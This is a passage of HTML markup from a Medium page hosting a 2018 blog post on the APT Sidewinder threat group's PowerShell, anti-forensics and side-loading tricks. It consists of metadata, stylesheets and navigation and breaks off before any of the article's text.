<!doctype html><html lang="en"><head><title data-rh="true">APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading | by Sebdraven | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" name="apple-itunes-app" content="app-id=828256236, app-argument=/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c, affiliate-data=pt=698524&amp;ct=smart_app_banner&amp;mt=8"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2018-07-17T14:57:10.410Z"/><meta data-rh="true" name="title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading | by Sebdraven | Medium"/><meta data-rh="true" property="og:title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading"/><meta data-rh="true" property="al:android:url" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="al:ios:url" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading Spear phishing I’ve started few days ago an analysis on a RTF following my recent researches. I found it this …"/><meta data-rh="true" property="og:description" content="Spear phishing"/><meta data-rh="true" property="og:url" content="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><meta data-rh="true" property="al:web:url" content="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1024/1*UNB3nsU-2fey_uCyR0BC4w.png"/><meta data-rh="true" property="article:author" content="https://sebdraven.medium.com"/><meta data-rh="true" name="author" content="Sebdraven"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/5bc1a7e7c84c"/><meta data-rh="true" property="twitter:description" content="Spear phishing"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1024/1*UNB3nsU-2fey_uCyR0BC4w.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:creator" content="@Sebdraven"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="7 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" rel="manifest" href="/manifest.json"/><link data-rh="true" rel="preconnect" href="https://www.google.com"/><link data-rh="true" rel="preconnect" href="https://www.gstatic.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://sebdraven.medium.com"/><link data-rh="true" rel="canonical" href="https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/5bc1a7e7c84c"/><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@id":"https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","@type":"SocialMediaPosting","image":["https://miro.medium.com/1*UNB3nsU-2fey_uCyR0BC4w.png"],"url":"https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","dateCreated":"2018-07-16T21:01:02Z","datePublished":"2018-07-16T21:01:02Z","dateModified":"2018-07-17T14:57:10Z","headline":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","name":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading","description":"APT Sidewinder: Tricks powershell, Anti Forensics and execution side loading Spear phishing I’ve started few days ago an analysis on a RTF following my recent researches. I found it this …","identifier":"5bc1a7e7c84c","author":{"@context":"https://schema.org","@id":"https://medium.com/@sebdraven","@type":"Person","identifier":"sebdraven","name":"Sebdraven","url":"https://medium.com/@sebdraven"},"creator":{"@context":"https://schema.org","@id":"https://medium.com/@sebdraven","@type":"Person","identifier":"sebdraven","name":"Sebdraven","url":"https://medium.com/@sebdraven"},"publisher":{"@context":"https://schema.org","@type":"Organization","@id":"https://medium.com","name":"Medium","url":"https://medium.com","logo":{"@type":"ImageObject","width":500,"height":110,"url":"https://miro.medium.com/v2/resize:fit:500/7%2AV1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https://sebdraven.medium.com/apt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c","isAccessibleForFree":true}</script><script data-rh="true" src="https://www.google.com/recaptcha/enterprise.js?render=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp" async="true"></script><style type="text/css" data-fela-rehydration="572" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="572" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.d{display:none}.m{display:block}.n{position:sticky}.o{top:0}.p{z-index:500}.q{padding:0 24px}.r{align-items:center}.s{border-bottom:solid 1px #F2F2F2}.z{height:41px}.ab{line-height:20px}.ac{display:flex}.ae{gap:32px}.af{height:57px}.ag{flex:1 0 auto}.ah{color:inherit}.ai{fill:inherit}.aj{font-size:inherit}.ak{border:none}.al{font-family:inherit}.am{letter-spacing:inherit}.an{font-weight:inherit}.ao{padding:0}.ap{margin:0}.aq{cursor:pointer}.ar:disabled{cursor:not-allowed}.as:disabled{color:#6B6B6B}.at:disabled{fill:#6B6B6B}.aw{width:auto}.ax path{fill:#242424}.ay{height:25px}.az{margin-left:24px}.ba{border-radius:20px}.bb{width:240px}.bc{background:#F9F9F9}.bd path{fill:#6B6B6B}.bf{outline:none}.bg{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bh{font-size:14px}.bi{width:100%}.bj{padding:10px 20px 10px 0}.bk{background-color:transparent}.bl{color:#242424}.bm::placeholder{color:#6B6B6B}.bn{display:inline-block}.bo{margin-left:12px}.bp{margin-right:12px}.bq{border-radius:4px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{flex:0 0 auto}.cd{flex:1 1 auto}.ci{justify-content:center}.co{max-width:680px}.cp{min-width:0}.cq{animation:k1 1.2s ease-in-out infinite}.cr{height:100vh}.cs{margin-bottom:16px}.ct{margin-top:48px}.cu{align-items:flex-start}.cv{flex-direction:column}.cw{justify-content:space-between}.cx{margin-bottom:24px}.dd{width:80%}.de{background-color:#F2F2F2}.dk{height:44px}.dl{width:44px}.dm{margin:auto 0}.dn{margin-bottom:4px}.do{height:16px}.dp{width:120px}.dq{width:80px}.dw{margin-bottom:8px}.dx{width:96%}.dy{width:98%}.dz{width:81%}.ea{margin-left:8px}.eb{color:#6B6B6B}.ec{font-size:13px}.ed{height:100%}.ew{color:#FFFFFF}.ex{fill:#FFFFFF}.ey{background:#1A8917}.ez{border-color:#1A8917}.fd:disabled{cursor:inherit !important}.fe:disabled{opacity:0.3}.ff:disabled:hover{background:#1A8917}.fg:disabled:hover{border-color:#1A8917}.fh{border-radius:99em}.fi{border-width:1px}.fj{border-style:solid}.fk{box-sizing:border-box}.fl{text-decoration:none}.fm{text-align:center}.fn{margin-left:16px}.fo{border:inherit}.fr{position:relative}.fs{fill:#6B6B6B}.fv{margin-right:32px}.fw{background:transparent}.fx svg{margin-left:4px}.fy svg{fill:#6B6B6B}.ga{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.gb{position:absolute}.gi{margin:0 24px}.gm{background:rgba(255, 255, 255, 1)}.gn{border:1px solid #F2F2F2}.go{box-shadow:0 1px 4px #F2F2F2}.gp{max-height:100vh}.gq{overflow-y:auto}.gr{left:0}.gs{top:calc(100vh + 100px)}.gt{bottom:calc(100vh + 100px)}.gu{width:10px}.gv{pointer-events:none}.gw{word-break:break-word}.gx{word-wrap:break-word}.gy:after{display:block}.gz:after{content:""}.ha:after{clear:both}.hb{line-height:1.23}.hc{letter-spacing:0}.hd{font-style:normal}.he{font-weight:700}.io{gap:12px}.ip{align-items:baseline}.iq{width:36px}.ir{height:36px}.is{border:2px solid rgba(255, 255, 255, 1)}.it{z-index:0}.iu{box-shadow:none}.iv{border:1px solid rgba(0, 0, 0, 0.05)}.iw{margin-bottom:2px}.ix{flex-wrap:nowrap}.iz{width:12px}.ja{flex-wrap:wrap}.jb{padding-left:8px}.jc{padding-right:8px}.kd> *{flex-shrink:0}.ke{overflow-x:scroll}.kf::-webkit-scrollbar{display:none}.kg{scrollbar-width:none}.kh{-ms-overflow-style:none}.ki{width:74px}.kj{flex-direction:row}.kk{z-index:2}.kl{margin-right:4px}.ko{-webkit-user-select:none}.kp{border:0}.kq{fill:rgba(117, 117, 117, 1)}.kt{outline:0}.ku{user-select:none}.kv> svg{pointer-events:none}.le{cursor:progress}.lf{opacity:1}.lg{padding:4px 0}.lj{margin-top:0px}.lk{width:16px}.lm{display:inline-flex}.ls{max-width:100%}.lt{padding:8px 2px}.lu svg{color:#6B6B6B}.ml{line-height:1.12}.mm{letter-spacing:-0.022em}.mn{font-weight:600}.ni{margin-bottom:-0.28em}.nj{float:left}.nk{font-size:66px}.nl{line-height:.83}.nr{line-height:1.58}.ns{letter-spacing:-0.004em}.nt{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.oo{margin-bottom:-0.46em}.ou{margin-left:auto}.ov{margin-right:auto}.ow{max-width:1322px}.pc{clear:both}.pe{cursor:zoom-in}.pf{z-index:auto}.ph{width:1px}.pi{height:1px}.pj{margin:-1px}.pk{overflow:hidden}.pl{clip:rect(0, 0, 0, 0)}.pm{white-space:nowrap}.pn{border-width:0}.po{height:auto}.pp{max-width:766px}.pq{max-width:733px}.pr{max-width:826px}.ps{text-decoration:underline}.pt{box-shadow:inset 3px 0 0 0 #242424}.pu{padding-left:23px}.pv{margin-left:-20px}.pw{font-style:italic}.px{max-width:989px}.py{max-width:969px}.pz{list-style-type:disc}.qa{margin-left:30px}.qb{padding-left:0px}.qh{max-width:634px}.qn{max-width:1192px}.qo{padding-top:5px}.qp{padding-bottom:5px}.qq{max-width:850px}.qr{margin-top:32px}.qs{margin-bottom:14px}.qt{padding-top:24px}.qu{padding-bottom:10px}.qv{background-color:#000000}.qw{height:3px}.qx{width:3px}.qy{margin-right:20px}.qz{max-width:1028px}.ra{max-width:1024px}.rg{box-shadow:inset 0 0 0 1px #F2F2F2}.rh{padding:0px}.ri{padding:16px 20px}.rk{font-size:16px}.rl{max-height:40px}.rm{text-overflow:ellipsis}.rn{display:-webkit-box}.ro{-webkit-line-clamp:2}.rp{-webkit-box-orient:vertical}.rr{margin-top:8px}.rs{margin-top:12px}.rt{width:160px}.ru{background-image:url(https://miro.medium.com/v2/da:true/resize:fit:320/0*BQtQCP2DxBVQoBT6)}.rv{background-origin:border-box}.rw{background-size:cover}.rx{height:167px}.ry{background-position:50% 50%}.rz{margin-bottom:26px}.sa{margin-top:6px}.sb{margin-right:8px}.sc{padding:8px 16px}.sd{border-radius:100px}.se{transition:background 300ms ease}.sg{border-top:none}.sh{margin-bottom:50px}.si{height:52px}.sj{max-height:52px}.sk{box-sizing:content-box}.sl{position:static}.sm{z-index:1}.so{max-width:155px}.su{margin-bottom:64px}.th{height:48px}.ti{width:48px}.tk{height:64px}.tl{width:64px}.tm{align-self:flex-end}.tq{padding-right:4px}.tr{font-weight:500}.ue{white-space:pre-wrap}.uf{margin:0 8px}.ug{margin-top:16px}.uh{margin-bottom:54px}.ui{height:0px}.uj{gap:18px}.uk{fill:rgba(61, 61, 61, 1)}.uw{border-bottom:solid 1px #E5E5E5}.ux{margin-top:72px}.uy{padding:24px 0}.uz{margin-bottom:0px}.va{margin-right:16px}.au:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.av:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.fa:hover{background:#156D12}.fb:hover{border-color:#156D12}.fc:hover{cursor:pointer}.ft:hover{color:#242424}.fu:hover{fill:#242424}.fz:hover svg{fill:#242424}.gc:hover{background-color:rgba(0, 0, 0, 0.1)}.iy:hover{text-decoration:underline}.ks:hover{fill:rgba(8, 8, 8, 1)}.lh:hover{fill:#000000}.li:hover p{color:#000000}.ll:hover{color:#000000}.lv:hover svg{color:#000000}.sf:hover{background-color:#F2F2F2}.tj:hover{background-color:none}.ul:hover{fill:rgba(25, 25, 25, 1)}.be:focus-within path{fill:#242424}.kr:focus{fill:rgba(8, 8, 8, 1)}.lw:focus svg{color:#000000}.pg:focus{transform:scale(1.01)}.kw:active{border-style:none}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="all and (min-width: 1080px)">.e{display:none}.bw{width:64px}.cc{display:block}.cn{margin:0 64px}.dc{height:48px}.dj{margin-bottom:52px}.dv{margin-bottom:48px}.em{font-size:14px}.eo{line-height:20px}.eu{font-size:13px}.ev{padding:5px 12px}.fq{display:flex}.gh{margin-bottom:50px}.gl{max-width:680px}.hz{font-size:42px}.ia{margin-top:1.19em}.ib{margin-bottom:32px}.ic{line-height:52px}.id{letter-spacing:-0.011em}.im{align-items:center}.in{flex-direction:row}.jp{border-top:solid 1px #F2F2F2}.jq{border-bottom:solid 1px #F2F2F2}.jr{margin:32px 0 0}.js{padding:3px 8px}.kb> *{margin-right:24px}.kc> :last-child{margin-right:0}.ld{margin-top:0px}.lr{margin:0}.ne{font-size:24px}.nf{margin-top:1.95em}.ng{line-height:30px}.nh{letter-spacing:-0.016em}.nq{padding-top:7px}.ok{font-size:20px}.ol{margin-top:0.94em}.om{line-height:32px}.on{letter-spacing:-0.003em}.ot{margin-top:2.14em}.pb{margin-top:56px}.qg{margin-top:1.14em}.qm{max-width:1192px}.rf{margin-top:32px}.st{display:inline-block}.sx{margin-bottom:0}.sy{margin-right:20px}.tn{max-width:500px}.uc{line-height:24px}.ud{letter-spacing:0}.uq{margin:40px 0 0}.uv{padding-top:72px}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.f{display:none}.lc{margin-top:0px}.ss{display:inline-block}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="all and (max-width: 903.98px)">.g{display:none}.lb{margin-top:0px}.sr{display:inline-block}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="all and (max-width: 727.98px)">.h{display:none}.kz{margin-top:0px}.la{margin-right:0px}.rj{padding:10px 12px 10px}.sq{display:inline-block}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="all and (max-width: 551.98px)">.i{display:none}.t{display:flex}.u{justify-content:space-between}.bs{width:24px}.ce{min-width:100%}.cj{margin:0 24px}.cy{height:40px}.df{margin-bottom:44px}.dr{margin-bottom:32px}.ee{font-size:13px}.ef{line-height:20px}.ep{padding:0px 8px 1px}.gd{margin-bottom:2px}.hf{font-size:32px}.hg{margin-top:1.01em}.hh{margin-bottom:24px}.hi{line-height:38px}.hj{letter-spacing:-0.014em}.ie{align-items:flex-start}.if{flex-direction:column-reverse}.jd{margin:24px -24px 0}.je{padding:0}.jt> *{margin-right:8px}.ju> :last-child{margin-right:24px}.km{margin-left:0px}.kx{margin-top:0px}.ky{margin-right:0px}.ln{margin:0}.lx{border:1px solid #F2F2F2}.ly{border-radius:99em}.lz{padding:0px 16px 0px 12px}.ma{height:38px}.mb{align-items:center}.md svg{margin-right:8px}.mo{font-size:20px}.mp{margin-top:1.2em}.mq{line-height:24px}.mr{letter-spacing:0}.nm{padding-top:0}.nu{font-size:18px}.nv{margin-top:0.67em}.nw{line-height:28px}.nx{letter-spacing:-0.003em}.op{margin-top:1.56em}.ox{margin-top:40px}.qc{margin-top:1.34em}.qi{max-width:100%}.rb{margin-top:24px}.sp{display:inline-block}.sw{flex-direction:column}.tf{margin-bottom:20px}.tg{margin-right:0}.ts{font-size:24px}.tt{line-height:30px}.tu{letter-spacing:-0.016em}.um{margin:32px 0 0}.ur{padding-top:48px}.mc:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.j{display:none}.bv{width:64px}.ch{min-width:100%}.cm{margin:0 64px}.db{height:48px}.di{margin-bottom:52px}.du{margin-bottom:48px}.ek{font-size:14px}.el{line-height:20px}.es{font-size:13px}.et{padding:5px 12px}.fp{display:flex}.gg{margin-bottom:50px}.gk{max-width:680px}.hu{font-size:42px}.hv{margin-top:1.19em}.hw{margin-bottom:32px}.hx{line-height:52px}.hy{letter-spacing:-0.011em}.ik{align-items:center}.il{flex-direction:row}.jl{border-top:solid 1px #F2F2F2}.jm{border-bottom:solid 1px #F2F2F2}.jn{margin:32px 0 0}.jo{padding:3px 8px}.jz> *{margin-right:24px}.ka> :last-child{margin-right:0}.lq{margin:0}.na{font-size:24px}.nb{margin-top:1.95em}.nc{line-height:30px}.nd{letter-spacing:-0.016em}.np{padding-top:7px}.og{font-size:20px}.oh{margin-top:0.94em}.oi{line-height:32px}.oj{letter-spacing:-0.003em}.os{margin-top:2.14em}.pa{margin-top:56px}.qf{margin-top:1.14em}.ql{max-width:1192px}.re{margin-top:32px}.sz{margin-bottom:0}.ta{margin-right:20px}.to{max-width:500px}.ua{line-height:24px}.ub{letter-spacing:0}.up{margin:40px 0 0}.uu{padding-top:72px}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.k{display:none}.x{display:flex}.y{justify-content:space-between}.bu{width:64px}.cg{min-width:100%}.cl{margin:0 48px}.da{height:48px}.dh{margin-bottom:52px}.dt{margin-bottom:48px}.ei{font-size:13px}.ej{line-height:20px}.er{padding:0px 8px 1px}.gf{margin-bottom:50px}.gj{max-width:680px}.hp{font-size:42px}.hq{margin-top:1.19em}.hr{margin-bottom:32px}.hs{line-height:52px}.ht{letter-spacing:-0.011em}.ii{align-items:center}.ij{flex-direction:row}.jh{border-top:solid 1px #F2F2F2}.ji{border-bottom:solid 1px #F2F2F2}.jj{margin:32px 0 0}.jk{padding:3px 8px}.jx> *{margin-right:24px}.jy> :last-child{margin-right:0}.lp{margin:0}.mw{font-size:24px}.mx{margin-top:1.95em}.my{line-height:30px}.mz{letter-spacing:-0.016em}.no{padding-top:7px}.oc{font-size:20px}.od{margin-top:0.94em}.oe{line-height:32px}.of{letter-spacing:-0.003em}.or{margin-top:2.14em}.oz{margin-top:56px}.qe{margin-top:1.14em}.qk{max-width:100%}.rd{margin-top:32px}.tb{margin-bottom:0}.tc{margin-right:20px}.tp{max-width:500px}.ty{line-height:24px}.tz{letter-spacing:0}.uo{margin:40px 0 0}.ut{padding-top:72px}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.l{display:none}.v{display:flex}.w{justify-content:space-between}.bt{width:24px}.cf{min-width:100%}.ck{margin:0 24px}.cz{height:40px}.dg{margin-bottom:44px}.ds{margin-bottom:32px}.eg{font-size:13px}.eh{line-height:20px}.eq{padding:0px 8px 1px}.ge{margin-bottom:2px}.hk{font-size:32px}.hl{margin-top:1.01em}.hm{margin-bottom:24px}.hn{line-height:38px}.ho{letter-spacing:-0.014em}.ig{align-items:flex-start}.ih{flex-direction:column-reverse}.jf{margin:24px 0 0}.jg{padding:0}.jv> *{margin-right:8px}.jw> :last-child{margin-right:8px}.kn{margin-left:0px}.lo{margin:0}.me{border:1px solid #F2F2F2}.mf{border-radius:99em}.mg{padding:0px 16px 0px 12px}.mh{height:38px}.mi{align-items:center}.mk svg{margin-right:8px}.ms{font-size:20px}.mt{margin-top:1.2em}.mu{line-height:24px}.mv{letter-spacing:0}.nn{padding-top:0}.ny{font-size:18px}.nz{margin-top:0.67em}.oa{line-height:28px}.ob{letter-spacing:-0.003em}.oq{margin-top:1.56em}.oy{margin-top:40px}.qd{margin-top:1.34em}.qj{max-width:100%}.rc{margin-top:24px}.sv{flex-direction:column}.td{margin-bottom:20px}.te{margin-right:0}.tv{font-size:24px}.tw{line-height:30px}.tx{letter-spacing:-0.016em}.un{margin:32px 0 0}.us{padding-top:48px}.mj:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="print">.sn{display:none}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.pd{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style><style type="text/css" data-fela-rehydration="572" data-fela-type="RULE" media="(orientation: landscape) and (max-width: 903.98px)">.rq{max-height:none}</style></head><body><div id="root"><div class="a b c"><a href="/sitemap/sitemap.xml" class="d">Sitemap</a><div class="e f g h i j k l"></div><script>document.domain = document.domain;</script><div class="m c"><div class="m n o p c"><div class="q r s t u v w x y j e z ab"><a class="eb ai ec bg am b ao ap aq ar as at au av t v x j e r ed ab" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F5bc1a7e7c84c&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;%7Estage=mobileNavBar&amp;source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="ea"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ac r"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><button class="bg b ee ef ep eg eh eq ei ej er es el et eu eo ev ew ex ey ez fa fb fc fd fe ff fg fh fi fj fk bn fl fm" data-testid="headerSignUpButton">Sign up</button></span></p><div class="fn m"><p class="bg b ee ef eg eh ei ej ek el em eo eb"><span data-dd-action-name="Susi presentation tracker global_nav"><a class="ah ai aj fo al am an ao ap aq ar as at au av" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fsebdraven.medium.com%2Fapt-sidewinder-tricks-powershell-anti-forensics-and-execution-side-loading-5bc1a7e7c84c&amp;source=post_page---top_nav_layout_nav-----------------------global_nav------------------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="q r s ac ae af"><div class="ac r ag"><a class="ah ai aj ak al am an ao ap aq ar as at au av ac" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" aria-labelledby="wordmark-medium-desc" viewBox="0 0 719 160" class="aw ax ay"><desc id="wordmark-medium-desc">Medium Logo</desc><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 